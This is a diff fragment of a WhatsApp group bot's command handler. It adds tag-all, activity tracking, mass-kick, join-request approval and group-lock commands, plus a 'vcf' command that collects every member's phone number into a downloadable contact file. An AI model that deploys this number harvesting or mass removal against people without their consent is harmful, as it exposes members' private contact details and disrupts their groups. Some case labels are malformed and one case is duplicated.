+            } else {
+                reply('Failed to fetch advice.');
+            }
+        } catch (error) {
+            console.error('Advice error:', error);
+            reply('Error fetching advice.');
+        }
+}
+break
+case "motivate": {
+try {
+    const apiUrl = `https://api.princetechn.com/api/fun/motivation?apikey=prince`;
+            const response = await axios.get(apiUrl);
+            
+            if (response.data?.success && response.data?.result) {
+                reply(response.data.result);
+            } else {
+                reply('Failed to fetch motivation message.');
+            }
+        } catch (error) {
+            console.error('Motivation error:', error);
+            reply('Error fetching motivation message.');
+        }
+}
+break
+case "character": {
+try {
+        // Ensure the command is used in a group
+        if (!isGroup) {
+            return reply("This command can only be used in groups.");
+        }
+
+        // Extract the mentioned user
+        const mentionedUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+        if (!mentionedUser) {
+            return reply("Please mention a user whose character you want to check.");
+        }
+
+        // Define character traits
+        const userChar = [
+            "Sigma",
+            "Generous",
+            "Grumpy",
+            "Overconfident",
+            "Obedient",
+            "Good",
+            "Simp",
+            "Kind",
+            "Patient",
+            "Pervert",
+            "Cool",
+            "Helpful",
+            "Brilliant",
+            "Sexy",
+            "Single",
+            "Hot",
+            "Gorgeous",
+            "Cute",
+        ];
+
+        // Randomly select a character trait
+        const userCharacterSelection =
+            userChar[Math.floor(Math.random() * userChar.length)];
+
+        // Message to send
+        const message = `Character of @${mentionedUser.split("@")[0]} is *${userCharacterSelection}* 🔥⚡`;
+
+        // Send the message with mentions
+        await conn.sendMessage(from, {
+            text: message,
+            mentions: [mentionedUser],
+        }, { quoted: m });
+
+    } catch (e) {
+        console.error("Error in character command:", e);
+        reply("An error occurred while processing the command. Please try again.");
+    }
+}
+//=====[GROUP MENU CMDS]======
+break 
+case "hidetag": case "h": {
+if (!m.isGroup) return reply(mess.group)
+if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+let members = groupMembers.map(a => a.id)
+conn.sendMessage(m.chat, {text : q ? q : 'Jexploit Is Always Here', mentions: members}, {quoted:m})
+}
+break
+case 'listactive':
+case 'activeusers': {
+    if (!m.isGroup) return reply(mess.group);
+    
+     const activeUsers = await GroupDB.getActiveUsers(from, 15);
+        
+        if (!activeUsers.length) {
+            return reply('*📊 No active users found in this group.*\n\nSend some messages first to track activity!');
+        }
+        
+        let message = `📊 *ACTIVE USERS - ${groupName || 'This Group'}*\n\n`;
+        
+        activeUsers.forEach((user, index) => {
+            const medal = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '🔹';
+            message += `${medal} ${index + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
+        });
+        
+        message += `\n📈 *Total tracked users:* ${activeUsers.length}`;
+        
+        await conn.sendMessage(m.chat, { 
+            text: message, 
+            mentions: activeUsers.map(u => u.jid) 
+        }, { quoted: m });
+}
+break
+case 'listinactive':
+case 'inactiveusers': {
+    if (!m.isGroup) return reply(mess.group);
+    
+    try {
+        const metadata = await conn.groupMetadata(from);
+        const allParticipants = metadata.participants.map(p => p.id);
+        
+        const inactiveUsers = await GroupDB.getInactiveUsers(from, allParticipants);
+        
+        if (!inactiveUsers || inactiveUsers.length === 0) {
+            return reply('*✅ No inactive users found!*\n\nAll members have sent at least one message since I joined.');
+        }
+        
+        let message = `⚠️ *INACTIVE USERS - ${groupName}*\n\n`;
+        message += `_Users who haven't sent any messages since tracking began:_\n\n`;
+        
+        // Format the list with mentions
+        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
+        message += `\n\n📊 *Total inactive:* ${inactiveUsers.length}`;
+
+        await conn.sendMessage(m.chat, { 
+            text: message, 
+            mentions: inactiveUsers 
+        }, { quoted: m });
+        
+    } catch (error) {
+        console.error('Error in listinactive command:', error);
+        reply('*Error fetching group data from database!*');
+    }
+    
+}
+break
+case 'groupactivity':
+case 'activity': {
+    if (!m.isGroup) return reply(mess.group);
+    
+    try {
+        const metadata = await conn.groupMetadata(from);
+        const allParticipants = metadata.participants.map(p => p.id);
+        const activeUsers = await GroupDB.getActiveUsers(from, 1000); // Get all active users
+        const inactiveUsers = await GroupDB.getInactiveUsers(from, allParticipants);
+        
+        let message = `📊 *GROUP ACTIVITY - ${groupName || 'This Group'}*\n\n`;
+        message += `*Total Members:* ${allParticipants.length}\n`;
+        message += `✅ *Active Users:* ${activeUsers.length}\n`;
+        message += `*Inactive Users:* ${inactiveUsers.length}\n\n`;
+        
+        if (activeUsers.length > 0) {
+            message += `🏆 *Top 3 Active Users:*\n`;
+            activeUsers.slice(0, 3).forEach((user, index) => {
+                const medals = ['🥇', '🥈', '🥉'];
+                message += `${medals[index]} @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
+            });
+            message += `\n`;
+        }
+        
+        if (inactiveUsers.length > 0) {
+            message += `💤 *Inactive Users (${inactiveUsers.length}):*\n`;
+            inactiveUsers.slice(0, 5).forEach((user, index) => {
+                message += `${index + 1}. @${user.split('@')[0]}\n`;
+            });
+            if (inactiveUsers.length > 5) {
+                message += `... and ${inactiveUsers.length - 5} more`;
+            }
+        }
+
+        const mentions = [
+            ...activeUsers.slice(0, 3).map(u => u.jid),
+            ...inactiveUsers.slice(0, 5)
+        ];
+        
+        await conn.sendMessage(m.chat, { 
+            text: message, 
+            mentions: mentions 
+        }, { quoted: m });
+        
+    } catch (error) {
+        console.error('Error in groupactivity command:', error);
+        await reply('❌ *Error fetching group activity!*');
+    }
+    
+}
+break
+case 'kickinactive':
+case 'removeinactive': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    try {
+        const metadata = await conn.groupMetadata(from);
+        const allParticipants = metadata.participants.map(p => p.id);
+        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
+        
+        const inactiveUsers = getInactiveUsers(from, allParticipants)
+            .filter(user => !groupAdmins.includes(user)); // Exclude admins
+
+        if (!inactiveUsers.length) {
+            return reply('*✅ No inactive users found to kick!*\n\nAll participants have sent messages or are admins.');
+        }
+
+        let message = `🚨 *KICKING INACTIVE USERS - ${metadata.subject || 'This Group'}*\n\n`;
+        message += `_The following users will be kicked in 25 seconds:_\n\n`;
+        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
+        message += `\n\n📊 *Total to kick:* ${inactiveUsers.length}`;
+        message += `\n⏰ *Time:* 25 seconds`;
+        message += `\n❌ *Cancel:* Use *${prefix}cancelkick* to stop`;
+
+        await conn.sendMessage(m.chat, { 
+            text: message, 
+            mentions: inactiveUsers 
+        }, { quoted: m });
+
+        // Store in kick queue
+        if (!global.kickQueue) global.kickQueue = new Map();
+        global.kickQueue.set(m.chat, { 
+            type: 'inactive', 
+            users: inactiveUsers,
+            timestamp: Date.now()
+        });
+
+        // Auto kick after 25 seconds
+        setTimeout(async () => {
+            if (!global.kickQueue.has(m.chat)) return;
+            
+            const queueData = global.kickQueue.get(m.chat);
+            if (queueData.type === 'inactive') {
+                for (let user of inactiveUsers) {
+                    try {
+                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
+                        // Small delay to avoid rate limiting
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } catch (userError) {
+                        console.error(`Failed to kick ${user}:`, userError);
+                    }
+                }
+                reply('✅ *Inactive users have been kicked successfully!*');
+                global.kickQueue.delete(m.chat);
+            }
+        }, 25000);
+
+    } catch (error) {
+        console.error('Error in kickinactive command:', error);
+        await reply('❌ *Error processing kick command!*');
+    }
+    break;
+}
+case 'cancelkick': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    try {
+        if (global.kickQueue && global.kickQueue.has(m.chat)) {
+            const queueData = global.kickQueue.get(m.chat);
+            const usersCount = queueData.users ? queueData.users.length : 0;
+            const kickType = queueData.type === 'inactive' ? 'Inactive Users Kick' : 
+                            queueData.type === 'all' ? 'Kick All Members' : 'Unknown Kick';
+            
+            global.kickQueue.delete(m.chat);
+            
+            let cancelMessage = `❌ *KICK OPERATION CANCELLED!*\n\n`;
+            cancelMessage += `📋 *Type:* ${kickType}\n`;
+            cancelMessage += `👥 *Users affected:* ${usersCount}\n`;
+            cancelMessage += `⏰ *Cancelled by:* @${m.sender.split('@')[0]}\n`;
+            cancelMessage += `✅ *Status:* Successfully cancelled`;
+            
+            await conn.sendMessage(m.chat, { 
+                text: cancelMessage, 
+                mentions: [m.sender]
+            });
+            
+        } else {
+            reply('❌ *No kick operation in progress!*\n\nThere is no active kick process to cancel.');
+        }
+    } catch (error) {
+        console.error('Error in cancelkick command:', error);
+        await reply('❌ *Error cancelling kick operation!*');
+    }
+    break;
+}
+case 'kickall':
+case 'removeall': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    try {
+        const metadata = await conn.groupMetadata(from);
+        const allParticipants = metadata.participants.map(p => p.id);
+        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
+        
+        // Get all non-admin members (users to kick)
+        const usersToKick = allParticipants.filter(user => !groupAdmins.includes(user));
+
+        if (!usersToKick.length) {
+            return reply('*✅ No members to kick!*\n\nOnly admins are in this group.');
+        }
+
+        let message = `🚨 *KICKING ALL MEMBERS - ${metadata.subject || 'This Group'}*\n\n`;
+        message += `_All non-admin members will be removed in 25 seconds:_\n\n`;
+        message += usersToKick.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
+        message += `\n\n📊 *Total to kick:* ${usersToKick.length}`;
+        message += `\n*Admins protected:* ${groupAdmins.length}`;
+        message += `\n*Time:* 25 seconds`;
+        message += `\n*Cancel:* Use *${prefix}cancelkick* to stop`;
+
+        await conn.sendMessage(m.chat, { 
+            text: message, 
+            mentions: usersToKick 
+        }, { quoted: m });
+
+        // Store in kick queue
+        if (!global.kickQueue) global.kickQueue = new Map();
+        global.kickQueue.set(m.chat, { 
+            type: 'all', 
+            users: usersToKick,
+            timestamp: Date.now()
+        });
+
+        // Auto kick after 25 seconds
+        setTimeout(async () => {
+            if (!global.kickQueue.has(m.chat)) return;
+            
+            const queueData = global.kickQueue.get(m.chat);
+            if (queueData.type === 'all') {
+                let successCount = 0;
+                let failCount = 0;
+                
+                for (let user of usersToKick) {
+                    try {
+                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
+                        successCount++;
+                        // Small delay to avoid rate limiting
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    } catch (userError) {
+                        console.error(`Failed to kick ${user}:`, userError);
+                        failCount++;
+                    }
+                }
+                
+                let resultMessage = `✅ *Kick All Operation Completed!*\n\n`;
+                resultMessage += `✓ Successfully kicked: ${successCount}\n`;
+                if (failCount > 0) {
+                    resultMessage += `✗ Failed to kick: ${failCount}\n`;
+                }
+                resultMessage += `🛡️ Admins remaining: ${groupAdmins.length}`;
+                
+                reply(resultMessage);
+                global.kickQueue.delete(m.chat);
+            }
+        }, 25000);
+
+    } catch (error) {
+        console.error('Error in kickall command:', error);
+        await reply('❌ *Error processing kick all command!*');
+    }
+    break;
+}
+case "tagall": {
+    if (!m.isGroup) return reply(mess.group);
+   if (!m.isAdmin) return reply(mess.notadmin);
+   if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    let me = m.sender;
+    let q = m.text.split(' ').slice(1).join(' ').trim(); // Extract the message after the command
+    let teks = `*TAGGED BY:* @${me.split("@")[0]}\n\n*MESSAGE:* ${q || "No message"}\n\n`;
+    
+    for (let mem of participants) {
+        teks += `@${mem.id.split("@")[0]}\n`;
+    }
+    
+    conn.sendMessage(
+        m.chat,
+        {
+            text: teks,
+            mentions: participants.map((a) => a.id),
+        },
+        {
+            quoted: m,
+        }
+    );
+}
+break
+case "togstatus": {
+if (!isGroup) return reply(mess.notgroup);
+            if (!m.isAdmin) return reply(mess.notadmin);
+            if (!m.isBotAdmin) return reply(mess.botadmin);
+        
+        try {
+            const messageText = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
+            const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
+            const commandRegex = /^[.!#/]?(togstatus|swgc|groupstatus|tosgroup)\s*/i;
+
+            if (!quotedMessage && (!messageText.trim() || messageText.trim().match(commandRegex))) {
+                return reply(getHelpText());
+            }
+
+            let payload = null;
+            let textAfterCommand = '';
+
+            if (messageText.trim()) {
+                const match = messageText.match(commandRegex);
+                if (match) textAfterCommand = messageText.slice(match[0].length).trim();
+            }
+
+            if (quotedMessage) {
+                payload = await buildPayloadFromQuoted(quotedMessage, conn);
+                if (textAfterCommand && payload) {
+                    if (payload.video || payload.image || (payload.convertedSticker && payload.image)) {
+                        payload.caption = textAfterCommand;
+                    }
+                }
+            } else if (messageText.trim()) {
+                if (textAfterCommand) {
+                    payload = { text: textAfterCommand };
+                } else {
+                    return reply(getHelpText());
+                }
+            }
+
+            if (!payload) {
+                return reply(getHelpText());
+            }
+
+            // Send group status
+            await sendGroupStatus(conn, m.chat, payload);
+
+            const mediaType = detectMediaType(quotedMessage, payload);
+            let successMsg = `✅ ${mediaType} sent!`;
+            if (payload.caption) successMsg += `\n📝 "${payload.caption}"`;
+            if (payload.convertedSticker) successMsg += `\n(sticker → image)`;
+
+            await reply(successMsg);
+
+        } catch (error) {
+            console.error('Error in group status command:', error);
+            await reply(`Error: ${error.message}`);
+        }
+}
+break
+case "mute":
+case "close": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    try {
+        await conn.groupSettingUpdate(m.chat, "announcement");
+        reply("🔒 *Group closed successfully!*\n\nOnly admins can send messages now.");
+    } catch (error) {
+        console.error("Error muting group:", error);
+        reply("❌ Failed to close the group. Make sure bot has admin permissions.");
+    }
+}
+break;
+case "delgrouppp": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        
+        await conn.removeProfilePicture(from);
+        reply("Group profile picture has been successfully removed.");
+}
+break
+case "setdesc": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+        
+        if (!text) return reply("*Please enter a text*");
+        
+        await conn.groupUpdateDescription(m.chat, text);
+        reply(mess.done);
+}
+break
+case "vcf": {
+try {
+        if (!isGroup) return reply("This command is for groups only.");
+        if (!Access) return reply("*_This command is for the owner only_*");
+
+        let card = quoted || m; // Handle if quoted message exists
+        let cmiggc = groupMetadata;
+        const { participants } = groupMetadata;
+        
+        let orgiggc = participants.map(a => a.id);
+        let vcard = '';
+        let noPort = 0;
+        
+        for (let a of cmiggc.participants) {
+            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
+        }
+
+        let nmfilect = './contacts.vcf';
+        reply('Saving ' + cmiggc.participants.length + ' participants contact');
+
+        fs.writeFileSync(nmfilect, vcard.trim());
+        await sleep(2000);
+
+        await conn.sendMessage(from, {
+            document: fs.readFileSync(nmfilect), 
+            mimetype: 'text/vcard', 
+            fileName: 'jexploit.vcf', 
+            caption: `\nDone saving.\nGroup Name: *${cmiggc.subject}*\nContacts: *${cmiggc.participants.length}*\n> Powered by ${global.botname} `}, { quoted: mek });
+
+        fs.unlinkSync(nmfilect); // Cleanup the file after sending
+    } catch (err) {
+        reply(err.toString());
+    }
+}
+break
+case 'approve': {
+if (!m.isGroup) return reply(mess.group)
+if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+const responseList = await conn.groupRequestParticipantsList(m.chat);
+
+if (responseList.length === 0) return reply("*No pending requests detected at the moment!*");
+
+for (const participan of responseList) {
+    const response = await conn.groupRequestParticipantsUpdate(
+        m.chat, 
+        [participan.jid], // Approve/reject each participant individually
+        "approve" // or "reject"
+    );
+    console.log(response);
+}
+reply(`*${global.botname} has approved all pending requests✅*`);
+
+}
+break
+case "listrequest":
+case "listreq":
+case "pending": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const groupId = m.chat;
+    await listGroupRequests(conn, m, groupId);
+}
+break
+case "approveall":
+case "acceptall":
+case "approve-all": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const groupId = m.chat;
+    await approveAllRequests(conn, m, groupId);
+}
+break
+
+case "disapproveall":
+case "rejectall":
+case "declineall":
+case "disapprove-all": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const groupId = m.chat;
+    await disapproveAllRequests(conn, m, groupId);
+}
+break
+case "mediatag": {
+        if (!m.isGroup) return reply(mess.group);
+  
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        
+        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);
+
+        conn.sendMessage(m.chat, {
+          forward: m.quoted.fakeObj,
+          mentions: participants.map((a) => a.id),
+        });
+}
+break
+case "promote":
+case "upgrade": {
+if (!Access) return reply(mess.owner);
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+       
+    let target = m.mentionedJid[0] 
+      ? m.mentionedJid[0] 
+      : m.quoted 
+      ? m.quoted.sender 
+      : text.replace(/\D/g, "") 
+      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
+      : null;
+
+    if (!target) return reply("⚠ *Mention or reply to a user to promote!*");
+
+    try {
+      await conn.groupParticipantsUpdate(m.chat, [target], "promote");
+      reply(`✅ *User promoted successfully!*`);
+    } catch (error) {
+      reply("❌ *Failed to promote user. They might already be an admin or the bot lacks permissions.*");
+    }
+  }
+break
+case "demote":
+case "downgrade": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    let target = m.mentionedJid[0] 
+      ? m.mentionedJid[0] 
+      : m.quoted 
+      ? m.quoted.sender 
+      : text.replace(/\D/g, "") 
+      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
+      : null;
+
+    if (!target) return reply("⚠ *Mention or reply to a user to demote!*");
+
+    try {
+      await conn.groupParticipantsUpdate(m.chat, [target], "demote");
+      reply(`✅ *User demoted successfully!*`);
+    } catch (error) {
+      reply("❌ *Failed to demote user. They might already be a member or the bot lacks permissions.*");
+    }
+}
+break
+case " getgrouppp": {
+if (!m.isGroup) return reply(mess.group);
+
+    try {
+      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');
+
+      await conn.sendMessage(m.chat, 
+        { 
+          image: { url: ppUrl }, 
+          caption: `🔹 *This Group's Profile Picture*`
+        }, 
+        { quoted: m }
+      );
+    } catch {
+      await conn.sendMessage(m.chat, 
+        { 
+          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
+          caption: '⚠️ No profile picture found for this group.'
+        }, 
+        { quoted: m }
+      );
+    }
+}
+
+break
+case "online":
+case "listonline": {
+    if (!m.isGroup) return reply(mess.group);
+    
+    try {
+        let id = args[0] && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
+        
+        // Safely check if presences exist
+        let presences = store.presences && store.presences[id] ? store.presences[id] : null;
+        
+        if (!presences || Object.keys(presences).length === 0) {
+            return reply('*No online members detected in this group.*');
+        }
+
+        // Safely get online members
+        let onlineMembers = [];
+        try {
+            onlineMembers = [...Object.keys(presences), botNumber];
+        } catch (e) {
+            console.error('Error getting online members:', e);
+            return reply('*Error detecting online members.*');
+        }
+
+        // Filter out invalid entries and ensure they're valid JIDs
+        const validOnlineMembers = onlineMembers.filter(member => 
+            member && typeof member === 'string' && member.includes('@')
+        );
+
+        if (validOnlineMembers.length === 0) {
+            return reply('*No online members detected in this group.*');
+        }
+
+        let liston = 1;
+        const onlineListText = '*ONLINE MEMBERS IN THIS GROUP*\n\n' + 
+            validOnlineMembers.map(v => {
+                const username = v.replace(/@.+/, '');
+                return `${liston++}. @${username}`;
+            }).join('\n');
+
+        // Send message with mentions
+        await conn.sendMessage(
+            m.chat,
+            {
+                text: onlineListText,
+                mentions: validOnlineMembers
+            },
+            { quoted: m }
+        );
+        
+    } catch (error) {
+        console.error('Error in listonline command:', error);
+        reply('*An error occurred while checking online members.*');
+    }
+    
+}
+break
+case "editinfo": {
+       if (!m.isGroup) return reply(mess.group);
+
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+
+        if (args[0] === "on") {
+            await conn.groupSettingUpdate(m.chat, "unlocked").then(
+                (res) => reply(`*Successful, members can edit group info*`)
+            );
+        } else if (args[0] === "off") {
+            await conn.groupSettingUpdate(m.chat, "locked").then((res) =>
+                reply(`*Successful, members cannot edit group info*`)
+            );
+        } else {
+            reply(`Example ${prefix + command} on/off`);
+        }
+}
+break
+case "invite": {
+        if (!m.isGroup) return reply(mess.group);
+ 
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+       
+        if (!text)
+            return reply(
+                `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command} 256742932677`
+            );
+        if (text.includes("+"))
+            return reply(`*Enter the number together without* *+*`);
+        if (isNaN(text))
+            return reply(
+                `*Enter only the numbers with your country code without spaces*`
+            );
+
+        let group = m.chat;
+        let link = "https://chat.whatsapp.com/" + (await conn.groupInviteCode(group));
+        await conn.sendMessage(text + "@s.whatsapp.net", {
+            text: `*GROUP INVITATION*\n\nSomeone invites you to join this group: \n\n${link}`,
+            mentions: [m.sender],
+        });
+        reply(`*Successfully sent invite link*`);
+}
+break
+case "linkgc": {
+if (!Access) return reply(mess.owner);
+        if (!m.isGroup) return reply(mess.group);
+
+    let response = await conn.groupInviteCode(m.chat);
+    conn.sendText(
+      m.chat,
+      `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined ? "+" + groupMetadata.owner.split`@`[0] : "Unknown"}\n\n*ID:* ${groupMetadata.id}\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length}`,
+      m,
+      {
+        detectLink: true,
+      }
+    );
+}
+break
+case "'unlockgc'": {
+try {
+        if (!isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        
+        await conn.groupSettingUpdate(from, "unlocked");
+        reply("🔓 Group settings are now unlocked", {
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        });
+
+    } catch (error) {
+        console.error("UnlockGS Error:", error);
+        reply("❌ Failed to unlock group settings");
+    }
+}
+break
+case "lockgcsettings":
+case "lockgc": {
+try {
+        if (!isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        await conn.groupSettingUpdate(from, 'locked');
+        reply("🔒 Group settings are now locked (admins only)", {
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        });
+
+    } catch (error) {
+        console.error("LockGS Error:", error);
+        reply("❌ Failed to lock group settings");
+    }
+}
+break
+case "unlockgcsettings":
+case "unlockgc": {
+    try {
+       if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        await conn.groupSettingUpdate(from, 'unlocked');
+        reply("🔓 Group settings are now unlocked (all participants)", {
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        });
+
+    } catch (error) {
+        console.error("UnlockGS Error:", error);
+        reply("❌ Failed to unlock group settings");
+    }
+}
+break
+case "adminapproval": {
+    try {
+       if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        // Get current group settings to check current state
+        const groupMetadata = await conn.groupMetadata(from);
+        
+        // Toggle admin approval mode
+        await conn.groupSettingUpdate(from, groupMetadata.announce ? 'not_announcement' : 'announcement');
+        
+        const newState = groupMetadata.announce ? "OFF" : "ON";
+        reply(`✅ Admin approval mode turned ${newState}`, {
+            contextInfo: {
+                forwardingScore: 999,
+                isForwarded: true
+            }
+        });
+
+    } catch (error) {
+        console.error("AdminApproval Error:", error);
+        reply("❌ Failed to toggle admin approval mode");
+    }
+}
+break
+case "closetime": {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+
+    // Check if both arguments are provided
+    if (!args[0] || !args[1]) {
+        return reply("*Usage:*\n.closetime [duration] [unit]\n\n*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
+    }
+
+    const duration = args[0];
+    const unit = args[1].toLowerCase();
+
+    let timer;
+    switch (unit) {
+        case "seconds":
+            timer = duration * 1000;
+            break;
+        case "minutes":
+            timer = duration * 60000;
+            break;
+        case "hours":
+            timer = duration * 3600000;
+            break;
+        case "days":
+            timer = duration * 86400000;
+            break;
+        default:
+            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
+    }
+
+    reply(`*Closing group after ${duration} ${unit}*`);
+    setTimeout(() => {
+        conn.groupSettingUpdate(m.chat, "announcement");
+        reply("*Group closed by admin. Only admins can send messages.*");
+    }, timer);
+}
+break
+case "opentime": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+
+    const duration = args[0];
+    if (!args[1] || typeof args[1] !== 'string') return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
+    const unit = args[1].toLowerCase();
+
+    let timer;
+    switch (unit) {
+        case "seconds":
+            timer = duration * 1000;
+            break;
+        case "minutes":
+            timer = duration * 60000;
+            break;
+        case "hours":
+            timer = duration * 3600000;
+            break;
+        case "days":
+            timer = duration * 86400000;
+            break;
+        default:
+            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
+    }
+
+    reply(`*Opening group after ${duration} ${unit}*`);
+    setTimeout(() => {
+        conn.groupSettingUpdate(m.chat, "not_announcement");
+        reply("*Group opened by admin. Members can now send messages.*");
+    }, timer);
+}
+break
+case "totalmembers": {
+if (!m.isGroup) return reply(mess.group);
+   
+    await conn.sendMessage(
+      m.chat,
+      {
+        text: `*GROUP*: ${groupMetadata.subject}\n*MEMBERS*: ${participants.length}`,
+      },
+      { quoted: m, ephemeralExpiration: 86400 }
+    );
+}
+break
+case "mediatag": {
+        if (!m.isGroup) return reply(mess.group);
+        if (!m.isAdmin) return reply(mess.notadmin);
+        if (!m.isBotAdmin) return reply(mess.botadmin);
+        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);
+
+        conn.sendMessage(m.chat, {
+          forward: m.quoted.fakeObj,
+          mentions: participants.map((a) => a.id),
+        });
+}
+break
+case "poll": {
+if (!Access) return reply(mess.owner);
+        if (!m.isGroup) return reply(mess.group);
+        let [poll, opt] = text.split("|");
+        if (text.split("|") < 2)
+            return await reply(
+                `Enter a question and at least 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
+            );
+        let options = [];
+        for (let i of opt.split(",")) {
+            options.push(i);
+        }
+        
+        await conn.sendMessage(m.chat, {
+            poll: {
+                name: poll,
+                values: options,
+            },
+        });
+}
+break
+case 'antilink': {
+    if (!m.isGroup) return reply(mess.group);
+    if (!m.isAdmin && !Access) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+    
+    const mode = args[0]?.toLowerCase();
+    const action = args[1]?.toLowerCase(); // Get second argument (on/off)
+    
+    // Show help if no arguments
+    if (!mode) {
+        const status = await db.getGroupSetting(botNumber, m.chat, 'antilink', false);
+        const currentMode = await db.getGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
+        return reply(`*ANTILINK SETTINGS*\n\nStatus: ${status ? '✅ ON' : '❌ OFF'}\nMode: ${currentMode}\n\nOptions:\n• ${prefix}antilink on\n• ${prefix}antilink off\n• ${prefix}antilink delete\n• ${prefix}antilink warn\n• ${prefix}antilink kick\n• ${prefix}antilink delete off\n• ${prefix}antilink warn off\n• ${prefix}antilink kick off`);
+    }
+    
+    // Handle on/off (global toggle)
+    if (mode === 'on') {
+        await db.setGroupSetting(botNumber, m.chat, 'antilink', true);
+        return reply('✅ Antilink has been enabled');
+    }
+    
+    if (mode === 'off') {
+        await db.setGroupSetting(botNumber, m.chat, 'antilink', false);
+        return reply('✅ Antilink has been disabled');
+    }
+    
+    // Handle mode settings with on/off action
+    if (mode === 'delete' || mode === 'warn' || mode === 'kick') {
+        
+        // If user wants to turn this specific mode ON
+        if (action === 'on') {
+            await db.setGroupSetting(botNumber, m.chat, 'antilinkmode', mode);
